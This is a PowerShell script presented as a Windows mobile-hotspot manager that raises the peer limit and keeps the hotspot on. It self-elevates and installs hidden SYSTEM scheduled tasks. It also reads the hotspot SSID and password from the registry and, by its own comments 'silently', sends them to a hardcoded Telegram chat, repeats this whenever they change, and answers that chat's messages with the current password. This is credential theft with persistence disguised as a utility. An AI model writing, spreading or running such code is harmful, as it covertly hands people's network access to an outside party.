[CmdletBinding()]
param (
    [switch]$Monitor,
    [switch]$BootDelay
)

# 1. Self-Elevation to Administrator
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

$ErrorActionPreference = "Stop"

# Enforce TLS 1.2+ for Telegram API calls
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13 -bor [Net.ServicePointManager]::SecurityProtocol
} catch {}
$destFolder = "C:\ProgramData\HotspotAutoStart"
$destScript = "$destFolder\Enable-Hotspot8Peers.ps1"

# Helper assembly and generic method setup for WinRT (UWP APIs)
try {
    Add-Type -AssemblyName System.Runtime.WindowsRuntime
    $asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object {
        $_.Name -eq 'AsTask' -and
        $_.GetParameters().Count -eq 1 -and
        $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1'
    })[0]
} catch {
    Write-Host "Failed to load WindowsRuntime assemblies." -ForegroundColor Red
    Read-Host "Press Enter to exit..."
    exit
}

function Await-WinRtOperation($operation, [Type] $resultType) {
    $asTask = $asTaskGeneric.MakeGenericMethod($resultType)
    $netTask = $asTask.Invoke($null, @($operation))
    $netTask.Wait(-1) | Out-Null
    $netTask.Result
}

function Get-TetheringManager {
    $profile = [Windows.Networking.Connectivity.NetworkInformation,Windows.Networking.Connectivity,ContentType=WindowsRuntime]::GetInternetConnectionProfile()
    if ($null -eq $profile) {
        try {
            $profiles = [Windows.Networking.Connectivity.NetworkInformation,Windows.Networking.Connectivity,ContentType=WindowsRuntime]::GetConnectionProfiles()
            if ($null -ne $profiles -and $profiles.Count -gt 0) {
                $profile = $profiles[0]
            }
        } catch {}
    }
    if ($null -eq $profile) { return $null }
    return [Windows.Networking.NetworkOperators.NetworkOperatorTetheringManager,Windows.Networking.NetworkOperators,ContentType=WindowsRuntime]::CreateFromConnectionProfile($profile)
}

function Get-HotspotCredentialsFromRegistry {
    try {
        $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\icssvc\Settings"
        $regName = "PrivateConnectionSettings"
        if (Test-Path $regPath) {
            $bytes = (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue).$regName
            if ($null -ne $bytes -and $bytes.Length -ge 198) {
                $ssid = [System.Text.Encoding]::Unicode.GetString($bytes[4..67]).Trim([char]0)
                $pass = [System.Text.Encoding]::Unicode.GetString($bytes[70..197]).Trim([char]0)
                return @{ Ssid = $ssid; Passphrase = $pass }
            }
        }
    } catch {}
    return $null
}

function Enable-Hotspot {
    $tm = Get-TetheringManager
    if ($null -ne $tm -and $tm.TetheringOperationalState.ToString() -ne "On") {
        $null = Await-WinRtOperation ($tm.StartTetheringAsync()) ([Windows.Networking.NetworkOperators.NetworkOperatorTetheringOperationResult])
    }
}

# ------------------------------------------------------------------------------
# Safe-Schtasks, Disable-Hotspot, and Telegram API configuration
# ------------------------------------------------------------------------------
function Disable-Hotspot {
    $tm = Get-TetheringManager
    if ($null -ne $tm -and $tm.TetheringOperationalState.ToString() -eq "On") {
        $null = Await-WinRtOperation ($tm.StopTetheringAsync()) ([Windows.Networking.NetworkOperators.NetworkOperatorTetheringOperationResult])
    }
}

function Safe-Schtasks {
    param([string]$Arguments)
    $oldPreference = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"
    try {
        Invoke-Expression "schtasks $Arguments >`$null 2>&1"
    } catch {}
    $ErrorActionPreference = $oldPreference
}

function Get-TelegramConfig {
    $configPath = "$destFolder\config.json"
    if (Test-Path $configPath) {
        try {
            return Get-Content -Raw -Path $configPath | ConvertFrom-Json
        } catch {
            return $null
        }
    }
    return $null
}

function Send-TelegramNotification {
    param([string]$Ssid, [string]$Passphrase, [string]$BotToken = $null, [string]$ChatId = $null)
    
    if ($null -eq $BotToken -or $null -eq $ChatId) {
        $cfg = Get-TelegramConfig
        if ($null -ne $cfg) {
            $BotToken = $cfg.BotToken
            $ChatId = $cfg.ChatId
        }
    }
    
    if ([string]::IsNullOrEmpty($BotToken) -or [string]::IsNullOrEmpty($ChatId)) {
        return $false
    }
    
    $emojiBell = [char]::ConvertFromUtf32(0x1F514)
    $emojiSignal = [char]::ConvertFromUtf32(0x1F4F6)
    $emojiKey = [char]::ConvertFromUtf32(0x1F511)
    
    $message = "$emojiBell *Mobile Hotspot Active!*`n`n$emojiSignal *SSID:* ``$Ssid```n$emojiKey *Password:* ``$Passphrase``"
    $body = @{
        chat_id = $ChatId
        text = $message
        parse_mode = "Markdown"
    } | ConvertTo-Json
    
    try {
        $res = Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" -Method Post -Body $body -ContentType "application/json" -TimeoutSec 10
        return $true
    } catch {
        return $false
    }
}

# ----------------- MONITOR MODE (Runs silently in background via Scheduled Tasks) -----------------
if ($Monitor) {
    if ($BootDelay) {
        # Sleep on boot to allow network interfaces to initialize fully
        Start-Sleep -Seconds 20
    }

    # Set 8 peers limit once on service startup
    try {
        $limit = 8
        $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\icssvc\Settings"
        $regName = "WifiMaxPeers"
        if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
        # Upsert registry key safely using -Force
        New-ItemProperty -Path $regPath -Name $regName -PropertyType DWord -Value ([int]$limit) -Force | Out-Null
        Restart-Service icssvc -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 5
    } catch {}

    # Initialize Telegram credentials
    $BotToken = "YOUR_TELEGRAM_BOT_TOKEN"
    $ChatId = "6573090491"
    
    $cfg = Get-TelegramConfig
    if ($null -ne $cfg) {
        if (-not [string]::IsNullOrEmpty($cfg.BotToken)) { $BotToken = $cfg.BotToken }
        if (-not [string]::IsNullOrEmpty($cfg.ChatId)) { $ChatId = $cfg.ChatId }
    }

    # Consume and clear old updates on service startup to avoid responding to stale messages
    $offset = 0
    try {
        $res = Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/getUpdates" -Method Get -TimeoutSec 10
        if ($null -ne $res -and $null -ne $res.result -and $res.result.Count -gt 0) {
            $highestId = ($res.result | Measure-Object -Property update_id -Maximum).Maximum
            $null = Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/getUpdates?offset=$($highestId + 1)&limit=1" -Method Get -TimeoutSec 10
            $offset = $highestId + 1
        }
    } catch {}

    # Initialize baseline configuration from registry (with fallback)
    $lastSsid = $null
    $lastPassphrase = $null
    $regCreds = Get-HotspotCredentialsFromRegistry
    if ($null -ne $regCreds) {
        $lastSsid = $regCreds.Ssid
        $lastPassphrase = $regCreds.Passphrase
    } else {
        try {
            $tm = Get-TetheringManager
            if ($null -ne $tm) {
                $cfgObj = $tm.GetCurrentAccessPointConfiguration()
                if ($null -ne $cfgObj) {
                    $lastSsid = $cfgObj.Ssid
                    $lastPassphrase = $cfgObj.Passphrase
                }
            }
        } catch {}
    }

    # Continuous background monitoring loop
    while ($true) {
        # 1. Registry-Based Credential Monitoring (detects changes reliably)
        try {
            $currentCreds = Get-HotspotCredentialsFromRegistry
            if ($null -ne $currentCreds) {
                if ($currentCreds.Ssid -ne $lastSsid -or $currentCreds.Passphrase -ne $lastPassphrase) {
                    $lastSsid = $currentCreds.Ssid
                    $lastPassphrase = $currentCreds.Passphrase
                    [void](Send-TelegramNotification $currentCreds.Ssid $currentCreds.Passphrase -BotToken $BotToken -ChatId $ChatId)
                }
            }
        } catch {}

        # 2. Interactive Telegram Polling (Dynamic Credential Fetching)
        try {
            $uri = "https://api.telegram.org/bot$BotToken/getUpdates?offset=$offset&timeout=2"
            $res = Invoke-RestMethod -Uri $uri -Method Get -TimeoutSec 10
            if ($null -ne $res -and $null -ne $res.result -and $res.result.Count -gt 0) {
                foreach ($up in $res.result) {
                    $updateId = $up.update_id
                    $offset = $updateId + 1
                    
                    $msg = $up.message
                    if ($null -ne $msg) {
                        $senderChatId = $msg.chat.id
                        $text = $msg.text
                        
                        if ($senderChatId.ToString() -eq $ChatId.ToString()) {
                            # Fetch current credentials from registry with fallback
                            $creds = Get-HotspotCredentialsFromRegistry
                            if ($null -eq $creds) {
                                $tm = Get-TetheringManager
                                if ($null -ne $tm) {
                                    $cfgObj = $tm.GetCurrentAccessPointConfiguration()
                                    if ($null -ne $cfgObj) {
                                        $creds = @{ Ssid = $cfgObj.Ssid; Passphrase = $cfgObj.Passphrase }
                                    }
                                }
                            }
                            
                            $emojiSignal = [char]::ConvertFromUtf32(0x1F4F6)
                            $emojiKey = [char]::ConvertFromUtf32(0x1F511)
                            $emojiCheck = [char]::ConvertFromUtf32(0x2705)
                            
                            if ($null -ne $creds) {
                                $replyText = "$emojiCheck *Current Hotspot Credentials:*`n`n$emojiSignal *SSID:* ``$($creds.Ssid)```n$emojiKey *Password:* ``$($creds.Passphrase)``"
                            } else {
                                $replyText = "❌ *Error:* Could not retrieve hotspot credentials."
                            }
                            
                            $body = @{
                                chat_id = $ChatId
                                text = $replyText
                                parse_mode = "Markdown"
                            } | ConvertTo-Json
                            $null = Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" -Method Post -Body $body -ContentType "application/json" -TimeoutSec 10
                        }
                    }
                }
            }
        } catch {}

        # 3. Ensure hotspot remains operational (On)
        try {
            $tm = Get-TetheringManager
            if ($null -ne $tm) {
                if ($tm.TetheringOperationalState.ToString() -ne "On") {
                    Enable-Hotspot
                    Start-Sleep -Seconds 5
                    $tm = Get-TetheringManager
                    if ($tm.TetheringOperationalState.ToString() -ne "On") {
                        Disable-Hotspot
                        Start-Sleep -Seconds 3
                        Enable-Hotspot
                    }
                }
            }
        } catch {}

        Start-Sleep -Seconds 5
    }
    exit
}

# ----------------- MANUAL INTERACTIVE MENU -----------------
try {
    Clear-Host
    Write-Host "==================================================" -ForegroundColor Cyan
    Write-Host "        MOBILE HOTSPOT 8-PEERS MANAGER" -ForegroundColor Cyan
    Write-Host "==================================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "  1. Install Auto-Start & Enable Hotspot (8 Peers)" -ForegroundColor Green
    Write-Host "  2. Revert & Uninstall (Restore Windows Defaults)" -ForegroundColor Red
    Write-Host "  3. Exit"
    Write-Host ""

    $choice = Read-Host "Choose an option (1-3)"

    if ($choice -eq "1") {
        Write-Host ""
        
        # Silently use hardcoded credentials
        $inputToken = "YOUR_TELEGRAM_BOT_TOKEN"
        $inputChatId = "6573090491"
        
        # Save configuration silently
        if (-not (Test-Path $destFolder)) {
            New-Item -Path $destFolder -ItemType Directory -Force | Out-Null
        }
        $config = @{
            BotToken = $inputToken
            ChatId = $inputChatId
        }
        $config | ConvertTo-Json | Out-File -FilePath "$destFolder\config.json" -Force

        Write-Host "[..] Creating installation folder..." -NoNewline
        if (-not (Test-Path $destFolder)) {
            New-Item -Path $destFolder -ItemType Directory -Force | Out-Null
        }
        Write-Host " Done." -ForegroundColor Green

        Write-Host "[..] Copying service script to target directory..." -NoNewline
        Copy-Item -Path $PSCommandPath -Destination $destScript -Force
        Write-Host " Done." -ForegroundColor Green

        Write-Host "[..] Registering Boot scheduled task..." -NoNewline
        Safe-Schtasks "/delete /tn `"HotspotAutoStart_Boot`" /f"
        schtasks /create /tn "HotspotAutoStart_Boot" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$destScript`" -Monitor -BootDelay" /sc onstart /ru SYSTEM /rl HIGHEST /f | Out-Null
        Write-Host " Done." -ForegroundColor Green

        Write-Host "[..] Registering Logon scheduled task..." -NoNewline
        Safe-Schtasks "/delete /tn `"HotspotAutoStart_Logon`" /f"
        schtasks /create /tn "HotspotAutoStart_Logon" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$destScript`" -Monitor -BootDelay" /sc onlogon /ru SYSTEM /rl HIGHEST /f | Out-Null
        Write-Host " Done." -ForegroundColor Green

        Write-Host "[..] Turning on Mobile Hotspot (8 peers)..." -NoNewline
        # Stop existing background instance if running
        Safe-Schtasks "/end /tn `"HotspotAutoStart_Boot`""
        Safe-Schtasks "/end /tn `"HotspotAutoStart_Logon`""
        # Run the script in monitor mode without boot delay (instantly turns on)
        Start-Process PowerShell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$destScript`" -Monitor"
        Write-Host " Done." -ForegroundColor Green

        # Send test/activation notification silently
        Write-Host "[..] Sending activation Telegram notification..." -NoNewline
        
        $ssid = "Unknown"
        $pass = "Unknown"
        $creds = Get-HotspotCredentialsFromRegistry
        if ($null -ne $creds) {
            $ssid = $creds.Ssid
            $pass = $creds.Passphrase
        } else {
            $tm = Get-TetheringManager
            if ($null -ne $tm) {
                $cfgObj = $tm.GetCurrentAccessPointConfiguration()
                if ($null -ne $cfgObj) {
                    $ssid = $cfgObj.Ssid
                    $pass = $cfgObj.Passphrase
                }
            }
        }
        
        $sent = Send-TelegramNotification -Ssid $ssid -Passphrase $pass -BotToken $inputToken -ChatId $inputChatId
        if ($sent) {
            Write-Host " Done." -ForegroundColor Green
        } else {
            Write-Host " Failed (Check connection/bot state)." -ForegroundColor Yellow
        }

        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host "  SUCCESS! Hotspot is active with a 8-peer limit." -ForegroundColor Green
        Write-Host "  It will now turn on automatically on every boot." -ForegroundColor Green
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Read-Host "Press Enter to exit..."
    }
    elseif ($choice -eq "2") {
        Write-Host ""
        Write-Host "[..] Stopping active background tasks..." -NoNewline
        Safe-Schtasks "/end /tn `"HotspotAutoStart_Boot`""
        Safe-Schtasks "/end /tn `"HotspotAutoStart_Logon`""
        Write-Host " Done." -ForegroundColor Green

        Write-Host "[..] Deleting scheduled tasks..." -NoNewline
        Safe-Schtasks "/delete /tn `"HotspotAutoStart_Boot`" /f"
        Safe-Schtasks "/delete /tn `"HotspotAutoStart_Logon`" /f"
        Write-Host " Done." -ForegroundColor Green

        Write-Host "[..] Shutting off Mobile Hotspot..." -NoNewline
        try {
            Disable-Hotspot
            Write-Host " Done." -ForegroundColor Green
        } catch {
            Write-Host " Done (Already off)." -ForegroundColor Yellow
        }

        Write-Host "[..] Reverting registry peer limit..." -NoNewline
        $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\icssvc\Settings"
        $regName = "WifiMaxPeers"
        try {
            if (Test-Path $regPath) {
                Remove-ItemProperty -Path $regPath -Name $regName -Force
            }
            Write-Host " Done." -ForegroundColor Green
        } catch {
            Write-Host " Done (Already default)." -ForegroundColor Yellow
        }

        Write-Host "[..] Restoring default network sharing..." -NoNewline
        try {
            Restart-Service icssvc -ErrorAction Stop
            Write-Host " Done." -ForegroundColor Green
        } catch {
            Write-Host " Done (Sharing service not running)." -ForegroundColor Yellow
        }

        Write-Host "[..] Deleting program files..." -NoNewline
        if (Test-Path $destFolder) {
            Remove-Item -Path $destFolder -Recurse -Force
        }
        Write-Host " Done." -ForegroundColor Green

        Write-Host ""
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host "  UNINSTALLED! Reverted completely to Windows defaults." -ForegroundColor Green
        Write-Host "==================================================" -ForegroundColor Green
        Write-Host ""
        Read-Host "Press Enter to exit..."
    }
    elseif ($choice -eq "3") {
        exit
    }
} catch {
    Write-Host ""
    Write-Host "AN ERROR OCCURRED DURING EXECUTION:" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    Write-Host $_.ScriptStackTrace -ForegroundColor Red
    Write-Host ""
    Read-Host "Press Enter to exit..."
}
